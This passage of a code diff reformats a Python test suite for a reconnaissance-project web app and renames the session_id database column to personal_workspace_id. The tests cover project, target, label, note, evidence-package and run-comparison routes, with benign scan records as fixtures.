-        with mock.patch.object(
-            project_routes,
-            "record_event",
-            side_effect=AuditRecordError("audit unavailable"),
-        ), pytest.raises(AuditRecordError):
+        with (
+            mock.patch.object(
+                project_routes,
+                "record_event",
+                side_effect=AuditRecordError("audit unavailable"),
+            ),
+            pytest.raises(AuditRecordError),
+        ):
             client.delete(
                 f"/projects/{project['id']}",
                 headers={"X-Session-ID": session_id},
@@ -7977,11 +7980,14 @@ class TestProjectRoutes:
         assert package_resp.status_code == 201
         package = json.loads(package_resp.data)["package"]
 
-        with mock.patch.object(
-            project_routes,
-            "record_event",
-            side_effect=AuditRecordError("audit unavailable"),
-        ), pytest.raises(AuditRecordError):
+        with (
+            mock.patch.object(
+                project_routes,
+                "record_event",
+                side_effect=AuditRecordError("audit unavailable"),
+            ),
+            pytest.raises(AuditRecordError),
+        ):
             client.delete(
                 f"/projects/{project['id']}/packages/{package['id']}",
                 headers={"X-Session-ID": session_id},
@@ -8001,13 +8007,15 @@ class TestProjectRoutes:
                 conn,
                 session_id,
                 run_id,
-                [{
-                    "text": "darklab.sh 104.21.4.35",
-                    "entities": [
-                        {"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"},
-                        {"type": "ip", "value": "104.21.4.35", "canonical_value": "104.21.4.35"},
-                    ],
-                }],
+                [
+                    {
+                        "text": "darklab.sh 104.21.4.35",
+                        "entities": [
+                            {"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"},
+                            {"type": "ip", "value": "104.21.4.35", "canonical_value": "104.21.4.35"},
+                        ],
+                    }
+                ],
                 team_id=team_id,
                 seen_at="2026-05-14T00:00:01+00:00",
             )
@@ -8076,8 +8084,8 @@ class TestProjectRoutes:
             rows = {
                 (row["type"], row["canonical_value"]): dict(row)
                 for row in conn.execute(
-                    "SELECT id, session_id, team_id, type, canonical_value, host_entity_id "
-                    "FROM entities WHERE session_id = ? AND canonical_value IN (?, ?, ?) "
+                    "SELECT id, personal_workspace_id, team_id, type, canonical_value, host_entity_id "
+                    "FROM entities WHERE personal_workspace_id = ? AND canonical_value IN (?, ?, ?) "
                     "ORDER BY type, canonical_value",
                     (
                         session_id,
@@ -8114,9 +8122,7 @@ class TestProjectRoutes:
             "value": "https://portal.darklab.sh/login/",
         }
         assert host_row["team_id"] == ""
-        assert [(item["type"], item["value"]) for item in listed_targets] == [
-            ("url", "https://portal.darklab.sh/login/")
-        ]
+        assert [(item["type"], item["value"]) for item in listed_targets] == [("url", "https://portal.darklab.sh/login/")]
 
     def test_project_targets_list_supports_pagination_type_search_and_auto_filter(self):
         client = get_client()
@@ -8144,18 +8150,24 @@ class TestProjectRoutes:
             )
             conn.commit()
 
-        domain_page = json.loads(client.get(
-            f"/projects/{project['id']}/targets?type=domain&limit=1",
-            headers={"X-Session-ID": session_id},
-        ).data)
-        search_page = json.loads(client.get(
-            f"/projects/{project['id']}/targets?q=login",
-            headers={"X-Session-ID": session_id},
-        ).data)
-        auto_page = json.loads(client.get(
-            f"/projects/{project['id']}/targets?auto_discovered=1",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        domain_page = json.loads(
+            client.get(
+                f"/projects/{project['id']}/targets?type=domain&limit=1",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
+        search_page = json.loads(
+            client.get(
+                f"/projects/{project['id']}/targets?q=login",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
+        auto_page = json.loads(
+            client.get(
+                f"/projects/{project['id']}/targets?auto_discovered=1",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
 
         assert domain_page["total"] == 2
         assert domain_page["limit"] == 1
@@ -8170,11 +8182,13 @@ class TestProjectRoutes:
         session_id = self._session_id("builtin-findings")
         project = self._create_project(client, session_id)
         run_id = self._seed_run(session_id, "history", run_kind="builtin")
-        target = json.loads(client.post(
-            f"/projects/{project['id']}/targets",
-            json={"type": "host", "value": "darklab.sh"},
-            headers={"X-Session-ID": session_id},
-        ).data)["target"]
+        target = json.loads(
+            client.post(
+                f"/projects/{project['id']}/targets",
+                json={"type": "host", "value": "darklab.sh"},
+                headers={"X-Session-ID": session_id},
+            ).data
+        )["target"]
         with db_connect() as conn:
             conn.execute(
                 "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
@@ -8188,7 +8202,7 @@ class TestProjectRoutes:
                 [{"text": "darklab.sh exposed service", "signals": ["findings"]}],
             )
             finding_count = conn.execute(
-                "SELECT COUNT(*) FROM findings WHERE session_id = ? AND run_id = ?",
+                "SELECT COUNT(*) FROM findings WHERE personal_workspace_id = ? AND run_id = ?",
                 (session_id, run_id),
             ).fetchone()[0]
             conn.execute("DELETE FROM project_links WHERE entity_id = ?", (run_id,))
@@ -8212,9 +8226,7 @@ class TestProjectRoutes:
         }
         registered_writes = []
         for rule in app.url_map.iter_rules():
-            methods = {"POST", "PUT", "PATCH", "DELETE"}.intersection(
-                rule.methods or set()
-            )
+            methods = {"POST", "PUT", "PATCH", "DELETE"}.intersection(rule.methods or set())
             if not rule.rule.startswith("/projects") or not methods:
                 continue
             if rule.endpoint in read_only_post_endpoints:
@@ -8255,14 +8267,8 @@ class TestProjectRoutes:
         assert first.status_code == 404
         assert second.status_code == 429
         assert json.loads(second.data)["error"] == "rate_limited"
-        rate_limit_call = next(
-            call for call in mock_warn.call_args_list
-            if call.args[0] == "RATE_LIMIT"
-        )
-        assert (
-            rate_limit_call.kwargs["extra"]["limit_policy"]
-            == "1 per minute; 1 per second"
-        )
+        rate_limit_call = next(call for call in mock_warn.call_args_list if call.args[0] == "RATE_LIMIT")
+        assert rate_limit_call.kwargs["extra"]["limit_policy"] == "1 per minute; 1 per second"
         assert "limit" not in rate_limit_call.kwargs["extra"]
 
     def test_default_baseline_http_rate_limit_allows_page_load_burst(self):
@@ -8322,24 +8328,30 @@ class TestProjectRoutes:
         assert project_label.status_code == 201
         labeled_list = json.loads(client.get("/projects", headers={"X-Session-ID": session_id}).data)
         assert [label["label"] for label in labeled_list["projects"][0]["labels"]] == ["important"]
-        paged_list = json.loads(client.get(
-            "/projects?include_archived=1&include_counts=1&limit=1&offset=0",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        paged_list = json.loads(
+            client.get(
+                "/projects?include_archived=1&include_counts=1&limit=1&offset=0",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert paged_list["total"] == 1
         assert paged_list["limit"] == 1
         assert paged_list["offset"] == 0
         assert paged_list["projects"][0]["counts"]["runs"] == 0
         assert [label["label"] for label in paged_list["projects"][0]["labels"]] == ["important"]
-        labeled_get = json.loads(client.get(
-            f"/projects/{project['id']}",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        labeled_get = json.loads(
+            client.get(
+                f"/projects/{project['id']}",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert [label["label"] for label in labeled_get["project"]["labels"]] == ["important"]
-        labeled_summary = json.loads(client.get(
-            f"/projects/{project['id']}/summary",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        labeled_summary = json.loads(
+            client.get(
+                f"/projects/{project['id']}/summary",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert [label["label"] for label in labeled_summary["project"]["labels"]] == ["important"]
 
         target_resp = client.post(
@@ -8370,11 +8382,13 @@ class TestProjectRoutes:
         assert target["seen_count"] == 1
         assert target["dismissed_at"] == ""
 
-        updated_target = json.loads(client.put(
-            f"/projects/{project['id']}/targets/{target['id']}",
-            json={"confidence": 0.8},
-            headers={"X-Session-ID": session_id},
-        ).data)["target"]
+        updated_target = json.loads(
+            client.put(
+                f"/projects/{project['id']}/targets/{target['id']}",
+                json={"confidence": 0.8},
+                headers={"X-Session-ID": session_id},
+            ).data
+        )["target"]
         assert updated_target["confidence"] == 0.8
         target_label = client.post(
             f"/entities/target/{target['id']}/labels",
@@ -8388,36 +8402,40 @@ class TestProjectRoutes:
         )
         assert target_label.status_code == 201
         assert target_note.status_code == 200
-        targets = json.loads(client.get(
-            f"/projects/{project['id']}/targets",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        targets = json.loads(
+            client.get(
+                f"/projects/{project['id']}/targets",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert [item["id"] for item in targets["targets"]] == [target["id"]]
         assert [item["label"] for item in targets["targets"][0]["labels"]] == ["Primary web domain"]
         assert targets["targets"][0]["note"]["body"] == "Scope approved"
-        fallback_target = json.loads(client.post(
-            f"/projects/{project['id']}/targets",
-            json={"type": "host", "value": "api.darklab.sh"},
-            headers={"X-Session-ID": session_id},
-        ).data)["target"]
+        fallback_target = json.loads(
+            client.post(
+                f"/projects/{project['id']}/targets",
+                json={"type": "host", "value": "api.darklab.sh"},
+                headers={"X-Session-ID": session_id},
+            ).data
+        )["target"]
         with sqlite3.connect(DB_PATH) as conn:
             finding_id = "fnd_target_delete_" + uuid.uuid4().hex
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, target_id, scope, raw_line, created) "
+                "(id, personal_workspace_id, run_id, target_id, scope, raw_line, created) "
                 "VALUES (?, ?, 'run_target_delete', ?, 'finding', 'target finding', datetime('now'))",
                 (finding_id, session_id, target["id"]),
             )
             conn.execute(
                 "INSERT INTO entity_labels "
-                "(id, session_id, entity_type, entity_id, label, created) "
+                "(id, personal_workspace_id, entity_type, entity_id, label, created) "
                 "VALUES (?, ?, 'finding', ?, 'finding-kept', datetime('now'))",
                 ("lbl_finding_target_delete_" + uuid.uuid4().hex, session_id, finding_id),
             )
             conn.commit()
         hidden_targets = client.get(
             f"/projects/{project['id']}/targets",
-            headers={"X-Session-ID": anonymous_session_id('other-session')},
+            headers={"X-Session-ID": anonymous_session_id("other-session")},
         )
         assert hidden_targets.status_code == 404
         delete_target_resp = client.delete(
@@ -8425,38 +8443,58 @@ class TestProjectRoutes:
             headers={"X-Session-ID": session_id},
         )
         assert delete_target_resp.status_code == 200
-        targets_after_delete = json.loads(client.get(
-            f"/projects/{project['id']}/targets",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        targets_after_delete = json.loads(
+            client.get(
+                f"/projects/{project['id']}/targets",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert [item["id"] for item in targets_after_delete["targets"]] == [fallback_target["id"]]
         with sqlite3.connect(DB_PATH) as conn:
-            assert conn.execute(
-                "SELECT COUNT(*) FROM entity_labels WHERE entity_type = 'atlas_entity' AND entity_id = ?",
-                (target["id"],),
-            ).fetchone()[0] == 0
-            assert conn.execute(
-                "SELECT COUNT(*) FROM entity_notes WHERE entity_type = 'atlas_entity' AND entity_id = ?",
-                (target["id"],),
-            ).fetchone()[0] == 0
-            assert conn.execute(
-                "SELECT COUNT(*) FROM project_links WHERE entity_type = 'atlas_entity' AND entity_id = ?",
-                (target["id"],),
-            ).fetchone()[0] == 0
-            assert conn.execute(
-                "SELECT COUNT(*) FROM project_links WHERE entity_type = 'atlas_entity' AND entity_id = ?",
-                (fallback_target["id"],),
-            ).fetchone()[0] == 1
-            assert conn.execute(
-                "SELECT COUNT(*) FROM entity_labels "
-                "WHERE session_id = ? AND entity_type = 'finding' AND label = 'finding-kept'",
-                (session_id,),
-            ).fetchone()[0] == 1
-            assert conn.execute(
-                "SELECT COUNT(*) FROM findings "
-                "WHERE session_id = ? AND run_id = 'run_target_delete' AND target_id = ?",
-                (session_id, target["id"]),
-            ).fetchone()[0] == 1
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM entity_labels WHERE entity_type = 'atlas_entity' AND entity_id = ?",
+                    (target["id"],),
+                ).fetchone()[0]
+                == 0
+            )
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM entity_notes WHERE entity_type = 'atlas_entity' AND entity_id = ?",
+                    (target["id"],),
+                ).fetchone()[0]
+                == 0
+            )
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM project_links WHERE entity_type = 'atlas_entity' AND entity_id = ?",
+                    (target["id"],),
+                ).fetchone()[0]
+                == 0
+            )
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM project_links WHERE entity_type = 'atlas_entity' AND entity_id = ?",
+                    (fallback_target["id"],),
+                ).fetchone()[0]
+                == 1
+            )
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM entity_labels "
+                    "WHERE personal_workspace_id = ? AND entity_type = 'finding' AND label = 'finding-kept'",
+                    (session_id,),
+                ).fetchone()[0]
+                == 1
+            )
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM findings "
+                    "WHERE personal_workspace_id = ? AND run_id = 'run_target_delete' AND target_id = ?",
+                    (session_id, target["id"]),
+                ).fetchone()[0]
+                == 1
+            )
 
         update_resp = client.put(
             f"/projects/{project['id']}",
@@ -8470,17 +8508,17 @@ class TestProjectRoutes:
         assert updated["status"] == "archived"
         assert updated["note"]["body"] == "private notes"
         with sqlite3.connect(DB_PATH) as conn:
-            assert conn.execute(
-                "SELECT body FROM entity_notes "
-                "WHERE session_id = ? AND entity_type = 'project' AND entity_id = ?",
-                (session_id, project["id"]),
-            ).fetchone()[0] == "private notes"
+            assert (
+                conn.execute(
+                    "SELECT body FROM entity_notes WHERE personal_workspace_id = ? AND entity_type = 'project' AND entity_id = ?",
+                    (session_id, project["id"]),
+                ).fetchone()[0]
+                == "private notes"
+            )
 
         default_list = json.loads(client.get("/projects", headers={"X-Session-ID": session_id}).data)
         assert default_list["projects"] == []
-        archived_list = json.loads(
-            client.get("/projects?include_archived=1", headers={"X-Session-ID": session_id}).data
-        )
+        archived_list = json.loads(client.get("/projects?include_archived=1", headers={"X-Session-ID": session_id}).data)
         assert [item["id"] for item in archived_list["projects"]] == [project["id"]]
 
         unarchive_resp = client.put(
@@ -8513,13 +8551,13 @@ class TestProjectRoutes:
             )
             conn.execute(
                 "INSERT INTO entity_labels "
-                "(id, session_id, entity_type, entity_id, label, created) "
+                "(id, personal_workspace_id, entity_type, entity_id, label, created) "
                 "VALUES (?, ?, 'project', ?, 'delete-me', datetime('now'))",
                 ("lbl_project_delete_" + uuid.uuid4().hex, session_id, project["id"]),
             )
             conn.execute(
                 "INSERT INTO entity_notes "
-                "(id, session_id, entity_type, entity_id, body, created, updated) "
+                "(id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                 "VALUES (?, ?, 'target', ?, 'delete target note', datetime('now'), datetime('now'))",
                 ("note_target_delete_" + uuid.uuid4().hex, session_id, cleanup_target["id"]),
             )
@@ -8530,48 +8568,65 @@ class TestProjectRoutes:
         missing_resp = client.get(f"/projects/{project['id']}", headers={"X-Session-ID": session_id})
         assert missing_resp.status_code == 404
         with sqlite3.connect(DB_PATH) as conn:
-            assert conn.execute(
-                "SELECT COUNT(*) FROM project_links WHERE project_id = ? AND entity_type = 'atlas_entity'",
-                (project["id"],),
-            ).fetchone()[0] == 0
-            assert conn.execute(
-                "SELECT COUNT(*) FROM project_auto_promote_rules WHERE project_id = ?",
-                (project["id"],),
-            ).fetchone()[0] == 0
-            assert conn.execute(
-                "SELECT COUNT(*) FROM entity_labels WHERE entity_type = 'project' AND entity_id = ?",
-                (project["id"],),
-            ).fetchone()[0] == 0
-            assert conn.execute(
-                "SELECT COUNT(*) FROM entity_notes WHERE entity_type = 'atlas_entity' AND entity_id = ?",
-                (cleanup_target["id"],),
-            ).fetchone()[0] == 0
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM project_links WHERE project_id = ? AND entity_type = 'atlas_entity'",
+                    (project["id"],),
+                ).fetchone()[0]
+                == 0
+            )
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM project_auto_promote_rules WHERE project_id = ?",
+                    (project["id"],),
+                ).fetchone()[0]
+                == 0
+            )
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM entity_labels WHERE entity_type = 'project' AND entity_id = ?",
+                    (project["id"],),
+                ).fetchone()[0]
+                == 0
+            )
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM entity_notes WHERE entity_type = 'atlas_entity' AND entity_id = ?",
+                    (cleanup_target["id"],),
+                ).fetchone()[0]
+                == 0
+            )
 
     def test_delete_project_keeps_entity_owned_finding_target_when_entity_is_linked_elsewhere(self):
         client = get_client()
         session_id = self._session_id("project-delete-primary-target")
         deleted_project = self._create_project(client, session_id, name="Deleted target project")
         remaining_project = self._create_project(client, session_id, name="Remaining target project")
-        deleted_target = json.loads(client.post(
-            f"/projects/{deleted_project['id']}/targets",
-            json={"type": "domain", "value": "darklab.sh"},
-            headers={"X-Session-ID": session_id},
-        ).data)["target"]
-        remaining_target = json.loads(client.post(
-            f"/projects/{remaining_project['id']}/targets",
-            json={"type": "host", "value": "api.darklab.sh"},
-            headers={"X-Session-ID": session_id},
-        ).data)["target"]
+        deleted_target = json.loads(
+            client.post(
+                f"/projects/{deleted_project['id']}/targets",
+                json={"type": "domain", "value": "darklab.sh"},
+                headers={"X-Session-ID": session_id},
+            ).data
+        )["target"]
+        remaining_target = json.loads(
+            client.post(
+                f"/projects/{remaining_project['id']}/targets",
+                json={"type": "host", "value": "api.darklab.sh"},
+                headers={"X-Session-ID": session_id},
+            ).data
+        )["target"]
         run_id = "run_project_delete_target_" + uuid.uuid4().hex
         finding_id = "fnd_" + uuid.uuid4().hex
         with sqlite3.connect(DB_PATH) as conn:
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, 'nmap darklab.sh', datetime('now'))",
+                "INSERT INTO runs (id, personal_workspace_id, command, started) "
+                "VALUES (?, ?, 'nmap darklab.sh', datetime('now'))",
                 (run_id, session_id),
             )
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, target_id, scope, raw_line, created) "
+                "(id, personal_workspace_id, run_id, target_id, scope, raw_line, created) "
                 "VALUES (?, ?, ?, ?, 'finding', 'target finding', datetime('now'))",
                 (finding_id, session_id, run_id, deleted_target["id"]),
             )
@@ -8583,14 +8638,20 @@ class TestProjectRoutes:
         )
         assert delete_resp.status_code == 200
         with sqlite3.connect(DB_PATH) as conn:
-            assert conn.execute(
-                "SELECT target_id FROM findings WHERE session_id = ? AND id = ?",
-                (session_id, finding_id),
-            ).fetchone()[0] == deleted_target["id"]
-            assert conn.execute(
-                "SELECT COUNT(*) FROM project_links WHERE project_id = ? AND entity_type = 'atlas_entity'",
-                (deleted_project["id"],),
-            ).fetchone()[0] == 0
+            assert (
+                conn.execute(
+                    "SELECT target_id FROM findings WHERE personal_workspace_id = ? AND id = ?",
+                    (session_id, finding_id),
+                ).fetchone()[0]
+                == deleted_target["id"]
+            )
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM project_links WHERE project_id = ? AND entity_type = 'atlas_entity'",
+                    (deleted_project["id"],),
+                ).fetchone()[0]
+                == 0
+            )
             assert remaining_target["id"]
 
     def test_projects_are_session_scoped_and_slugs_are_unique_per_session(self):
@@ -8604,10 +8665,12 @@ class TestProjectRoutes:
         assert first["slug"] == "case"
         assert second["slug"] == "case-2"
         assert other_session["slug"] == "case"
-        page = json.loads(client.get(
-            "/projects?include_archived=1&limit=1&offset=1",
-            headers={"X-Session-ID": session_a},
-        ).data)
+        page = json.loads(
+            client.get(
+                "/projects?include_archived=1&limit=1&offset=1",
+                headers={"X-Session-ID": session_a},
+            ).data
+        )
         assert page["total"] == 2
         assert page["offset"] == 1
         assert len(page["projects"]) == 1
@@ -8727,18 +8790,22 @@ class TestProjectRoutes:
             )
             assert resp.status_code == 200
 
-        empty_page = json.loads(client.get(
-            "/projects?mode=switcher&limit=3",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        empty_page = json.loads(
+            client.get(
+                "/projects?mode=switcher&limit=3",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert [project["id"] for project in empty_page["projects"][:2]] == [alpha["id"], beta["id"]]
         assert empty_page["active_project_id"] == alpha["id"]
         assert empty_page["limit"] == 3
 
-        search_page = json.loads(client.get(
-            "/projects?mode=switcher&q=needle&limit=2",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        search_page = json.loads(
+            client.get(
+                "/projects?mode=switcher&q=needle&limit=2",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert [project["id"] for project in search_page["projects"]] == [gamma["id"], zzz["id"]]
         assert search_page["active_project_id"] == alpha["id"]
         assert search_page["query"] == "needle"
@@ -8749,10 +8816,12 @@ class TestProjectRoutes:
             headers={"X-Session-ID": session_id},
         )
         assert archived.status_code == 200
-        pruned_page = json.loads(client.get(
-            "/projects?mode=switcher&limit=4",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        pruned_page = json.loads(
+            client.get(
+                "/projects?mode=switcher&limit=4",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert beta["id"] not in {project["id"] for project in pruned_page["projects"]}
 
     def test_package_presets_route_returns_shipped_catalog(self):
@@ -8771,7 +8840,8 @@ class TestProjectRoutes:
         session_id = self._session_id("package-presets-custom")
         with tempfile.TemporaryDirectory() as tmp:
             path = Path(tmp) / "package_presets.yaml"
-            path.write_text(textwrap.dedent("""
+            path.write_text(
+                textwrap.dedent("""
             presets:
               - id: brief
                 label: Brief
@@ -8781,7 +8851,8 @@ class TestProjectRoutes:
                   findings: none
                   artifacts: none
                   targets: all
-            """))
+            """)
+            )
             with mock.patch.dict(project_routes.CFG, {"package_presets_file": str(path)}, clear=False):
                 resp = client.get("/projects/package-presets", headers={"X-Session-ID": session_id})
 
@@ -8794,7 +8865,8 @@ class TestProjectRoutes:
         project = self._create_project(client, session_id)
         with tempfile.TemporaryDirectory() as tmp:
             path = Path(tmp) / "package_presets.yaml"
-            path.write_text(textwrap.dedent("""
+            path.write_text(
+                textwrap.dedent("""
             presets:
               - id: customer_handoff
                 label: Customer Handoff
@@ -8804,7 +8876,8 @@ class TestProjectRoutes:
                   findings: none
                   artifacts: none
                   targets: all
-            """))
+            """)
+            )
             with mock.patch.dict(project_routes.CFG, {"package_presets_file": str(path)}, clear=False):
                 resp = client.post(
                     f"/projects/{project['id']}/packages",
@@ -8841,7 +8914,7 @@ class TestProjectRoutes:
         with db_connect() as conn:
             conn.execute(
                 "INSERT INTO evidence_packages "
-                "(id, session_id, project_id, name, description, redaction_mode, "
+                "(id, personal_workspace_id, project_id, name, description, redaction_mode, "
                 "include_artifacts, manifest, status, created, updated) "
                 "VALUES (?, ?, ?, ?, '', 'raw', 0, ?, 'draft', ?, ?)",
                 (
@@ -8876,7 +8949,7 @@ class TestProjectRoutes:
         with db_connect() as conn:
             conn.execute(
                 "INSERT INTO evidence_packages "
-                "(id, session_id, project_id, name, description, redaction_mode, "
+                "(id, personal_workspace_id, project_id, name, description, redaction_mode, "
                 "include_artifacts, manifest, status, created, updated) "
                 "VALUES (?, ?, ?, ?, '', 'raw', 0, ?, 'draft', ?, ?)",
                 (
@@ -9007,10 +9080,12 @@ class TestProjectRoutes:
         )
         assert missing_entity.status_code == 404
 
-        owner_note = json.loads(client.get(
-            f"/entities/run/{run_id}/note",
-            headers={"X-Session-ID": session_id},
-        ).data)["note"]
+        owner_note = json.loads(
+            client.get(
+                f"/entities/run/{run_id}/note",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )["note"]
         assert owner_note["body"] == "Owner-only note"
 
         snapshot_label_resp = client.post(
@@ -9025,15 +9100,19 @@ class TestProjectRoutes:
             headers={"X-Session-ID": session_id},
         )
         assert snapshot_note_resp.status_code == 200
-        snapshot_labels = json.loads(client.get(
-            f"/entities/snapshot/{snapshot_id}/labels",
-            headers={"X-Session-ID": session_id},
-        ).data)["labels"]
+        snapshot_labels = json.loads(
+            client.get(
+                f"/entities/snapshot/{snapshot_id}/labels",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )["labels"]
         assert [item["label"] for item in snapshot_labels] == ["handoff"]
-        snapshot_note = json.loads(client.get(
-            f"/entities/snapshot/{snapshot_id}/note",
-            headers={"X-Session-ID": session_id},
-        ).data)["note"]
+        snapshot_note = json.loads(
+            client.get(
+                f"/entities/snapshot/{snapshot_id}/note",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )["note"]
         assert snapshot_note["body"] == "Snapshot context"
 
         cross_session_label = client.get(
@@ -9152,7 +9231,12 @@ class TestProjectRoutes:
         assert payload["objects"]["artifacts"] == {"added": [], "removed": [], "unchanged_count": 0}
         assert len(payload["density_buckets"]) == 256
         assert payload["density_buckets"][0] == {
-            "start": 0, "end": 0, "equal": 0, "added": 0, "removed": 0, "changed": 0,
+            "start": 0,
+            "end": 0,
+            "equal": 0,
+            "added": 0,
+            "removed": 0,
+            "changed": 0,
         }
         assert payload["limits"]["minimap_buckets"] == 256
         assert payload["truncated"] == {
@@ -9164,14 +9248,16 @@ class TestProjectRoutes:
         }
 
         with sqlite3.connect(DB_PATH) as conn:
-            for line_number, raw_line in enumerate([
-                "one.darklab.sh",
-                "two.darklab.sh",
-                "old.darklab.sh",
-            ]):
+            for line_number, raw_line in enumerate(
+                [
+                    "one.darklab.sh",
+                    "two.darklab.sh",
+                    "old.darklab.sh",
+                ]
+            ):
                 conn.execute(
                     "INSERT INTO findings "
-                    "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
+                    "(id, personal_workspace_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                     "VALUES (?, ?, ?, 'finding', ?, ?, ?, ?, datetime('now'))",
                     (
                         f"fnd_compare_left_{line_number}_{uuid.uuid4().hex[:8]}",
@@ -9183,14 +9269,16 @@ class TestProjectRoutes:
                         f"fp-left-{line_number}-{left_run_id}",
                     ),
                 )
-            for line_number, raw_line in enumerate([
-                "two.darklab.sh",
-                "one.darklab.sh",
-                "new.darklab.sh",
-            ]):
+            for line_number, raw_line in enumerate(
+                [
+                    "two.darklab.sh",
+                    "one.darklab.sh",
+                    "new.darklab.sh",
+                ]
+            ):
                 conn.execute(
                     "INSERT INTO findings "
-                    "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
+                    "(id, personal_workspace_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                     "VALUES (?, ?, ?, 'finding', ?, ?, ?, ?, datetime('now'))",
                     (
                         f"fnd_compare_right_{line_number}_{uuid.uuid4().hex[:8]}",
@@ -9205,7 +9293,7 @@ class TestProjectRoutes:
             for prefix, run_id in (("left", left_run_id), ("right", right_run_id)):
                 conn.execute(
                     "INSERT INTO run_file_artifacts "
-                    "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
+                    "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                     "VALUES (?, ?, ?, ?, ?, 'output', 8, 'workspace_flag', datetime('now'))",
                     (
                         f"rfa_compare_cap_{prefix}_{uuid.uuid4().hex[:8]}",
@@ -9272,7 +9360,7 @@ class TestProjectRoutes:
         with sqlite3.connect(DB_PATH) as conn:
             conn.execute(
                 "INSERT INTO run_file_artifacts "
-                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, "
+                "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, "
                 "detected_by, content_sha256, created) "
                 "VALUES (?, ?, ?, 'reports/left.txt', 'left.txt', 'output', 19, "
                 "'workspace_flag', ?, datetime('now'))",
@@ -9280,7 +9368,7 @@ class TestProjectRoutes:
             )
             conn.execute(
                 "INSERT INTO run_file_artifacts "
-                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, "
+                "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, "
                 "detected_by, content_sha256, created) "
                 "VALUES (?, ?, ?, 'reports/right.txt', 'right.txt', 'output', 19, "
                 "'workspace_flag', ?, datetime('now'))",
@@ -9315,23 +9403,20 @@ class TestProjectRoutes:
         self._link_run(client, session_id, project["id"], right_run_id)
 
         linked = client.get(
-            f"/history/compare/lines?left={left_run_id}&right={right_run_id}"
-            f"&project_id={project['id']}&side=a&start=0&end=0",
+            f"/history/compare/lines?left={left_run_id}&right={right_run_id}&project_id={project['id']}&side=a&start=0&end=0",
             headers={"X-Session-ID": session_id},
         )
         assert linked.status_code == 200
         assert json.loads(linked.data)["lines"] == []
 
         unlinked = client.get(
-            f"/history/compare/lines?left={left_run_id}&right={unlinked_run_id}"
-            f"&project_id={project['id']}&side=a&start=0&end=0",
+            f"/history/compare/lines?left={left_run_id}&right={unlinked_run_id}&project_id={project['id']}&side=a&start=0&end=0",
             headers={"X-Session-ID": session_id},
         )
         assert unlinked.status_code == 400
 
         cross_session = client.get(
-            f"/history/compare/lines?left={left_run_id}&right={right_run_id}"
-            f"&project_id={project['id']}&side=a&start=0&end=0",
+            f"/history/compare/lines?left={left_run_id}&right={right_run_id}&project_id={project['id']}&side=a&start=0&end=0",
             headers={"X-Session-ID": other_session},
         )
         assert cross_session.status_code == 404
@@ -9353,34 +9438,36 @@ class TestProjectRoutes:
         outside_run_id = "run-" + uuid.uuid4().hex
         with sqlite3.connect(DB_PATH) as conn:
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, ?, ?, ?, ?)",
                 (
                     run_id,
                     session_id,
                     "nmap darklab.sh",
                     "2026-07-11T00:02:00+00:00",
-                    json.dumps([
-                        {
-                            "text": "443/tcp open https",
-                            "cls": "",
-                            "line_index": 0,
-                            "signals": ["findings"],
-                            "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
-                        },
-                        {
-                            "text": "rate:  0.10-kpps, 49.90% done,   0:00:09 remaining, found=2",
-                            "role": "progress",
-                            "noise_kind": "progress",
-                            "line_index": 1,
-                        },
-                        {"text": "scan completed", "cls": "", "line_index": 2},
-                    ]),
+                    json.dumps(
+                        [
+                            {
+                                "text": "443/tcp open https",
+                                "cls": "",
